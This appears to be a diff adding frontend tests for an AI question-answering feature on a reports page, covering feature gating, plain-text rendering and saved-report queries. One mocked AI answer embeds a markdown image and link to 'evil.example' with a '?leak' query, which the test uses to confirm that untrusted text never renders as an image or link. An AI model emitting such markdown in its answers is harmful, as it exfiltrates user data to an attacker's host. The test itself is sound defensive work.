@@ -7,7 +7,7 @@ import type { ReportResult, SavedReport } from './api/client';
 import App from './App';
 import { ReportView } from './components/ReportView';
 import { resultToCsv } from './lib/reportMeta';
-import { baseRoutes, mockApi, user, type Route } from './test/mockApi';
+import { aiOn, baseRoutes, mockApi, user, type Route } from './test/mockApi';
 
 function renderAt(path: string) {
   window.history.pushState({}, '', path);
@@ -213,5 +213,88 @@ describe('dashboard report tiles', () => {
     const last = calls.filter((c) => c.url.endsWith('/reports/r1/run')).at(-1)!;
     expect(await last.json()).toEqual({ date: { preset: 'last_7_days' }, project_ids: [] });
     expect(new URLSearchParams(window.location.search).get('range')).toBe('last_7_days');
+  });
+});
+
+describe('asking about reports', () => {
+  const aiReports: Route = {
+    ...aiOn,
+    body: { ...(aiOn.body as object), features: ['search', 'reports'] },
+  };
+  const answer = (overrides: object = {}) => ({
+    question: 'Which priority is most overdue?',
+    answer: 'High has the most.\n\n![x](https://evil.example/?leak) [click](https://evil.example)',
+    explanation: 'Tasks by priority',
+    saved_report_id: null,
+    saved_report_name: null,
+    definition: { ...saved.definition, group_by: ['priority'], measures: ['count'], chart: 'table' },
+    result: result(),
+    usage: { input_tokens: 1, output_tokens: 1, provider: 'fake', model: 'fake' },
+    ...overrides,
+  });
+
+  it('is hidden unless the feature is on', async () => {
+    mockApi([...baseRoutes, signedIn, { method: 'GET', path: '/api/v1/reports', body: [] }]);
+    renderAt('/reports');
+    await screen.findByRole('heading', { name: 'Your reports' });
+    expect(screen.queryByRole('heading', { name: 'Ask a question' })).toBeNull();
+  });
+
+  it('answers in plain text beside the report and opens it in the builder', async () => {
+    const { calls } = mockApi([
+      aiReports,
+      ...baseRoutes,
+      signedIn,
+      { method: 'GET', path: '/api/v1/reports', body: [] },
+      { method: 'POST', path: '/api/v1/ai/reports', body: answer() },
+      { method: 'POST', path: '/api/v1/reports/run', body: result() },
+    ]);
+    renderAt('/reports?ask=Which%20priority%20is%20most%20overdue%3F');
+    expect(await screen.findByText('High has the most.')).toBeInTheDocument();
+    expect(screen.getByLabelText('Question')).toHaveValue('Which priority is most overdue?');
+    const ask = calls.find((c) => c.url.endsWith('/ai/reports'))!;
+    expect(await ask.json()).toEqual({ question: 'Which priority is most overdue?', report_id: null });
+    // Untrusted text never becomes a link or an image.
+    expect(document.querySelector('img')).toBeNull();
+    expect(screen.queryByRole('link', { name: 'click' })).toBeNull();
+    expect(screen.getByRole('table', { name: 'Answer' })).toBeInTheDocument();
+    expect(screen.getByText(/Report used: Tasks by priority/)).toBeInTheDocument();
+
+    await userEvent.click(screen.getByRole('link', { name: 'Open in the report builder' }));
+    expect(await screen.findByRole('heading', { name: 'New report', level: 1 })).toBeInTheDocument();
+    expect(screen.getByLabelText('Name')).toHaveValue('Which priority is most overdue?');
+    await waitFor(async () =>
+      expect(
+        await calls
+          .filter((c) => c.url.endsWith('/reports/run'))
+          .at(-1)!
+          .clone()
+          .json(),
+      ).toMatchObject({ group_by: ['priority'], measures: ['count'] }),
+    );
+  });
+
+  it('asks about a saved report as it is', async () => {
+    const { calls } = mockApi([
+      aiReports,
+      ...baseRoutes,
+      signedIn,
+      { method: 'GET', path: '/api/v1/reports/r1', body: saved },
+      { method: 'GET', path: '/api/v1/dashboards', body: [] },
+      { method: 'POST', path: '/api/v1/reports/run', body: result() },
+      {
+        method: 'POST',
+        path: '/api/v1/ai/reports',
+        body: answer({ saved_report_id: 'r1', saved_report_name: 'Open work', answer: 'Seven open.' }),
+      },
+    ]);
+    renderAt('/reports/r1');
+    await userEvent.type(await screen.findByLabelText('Question'), 'How many?');
+    await userEvent.click(screen.getByRole('button', { name: 'Ask' }));
+    expect(await screen.findByText('Seven open.')).toBeInTheDocument();
+    expect(screen.getByText(/From your saved report “Open work”/)).toBeInTheDocument();
+    const ask = calls.find((c) => c.url.endsWith('/ai/reports'))!;
+    expect(await ask.json()).toEqual({ question: 'How many?', report_id: 'r1' });
+    expect(screen.queryByRole('link', { name: /Open “Open work”/ })).toBeNull();
   });
 });
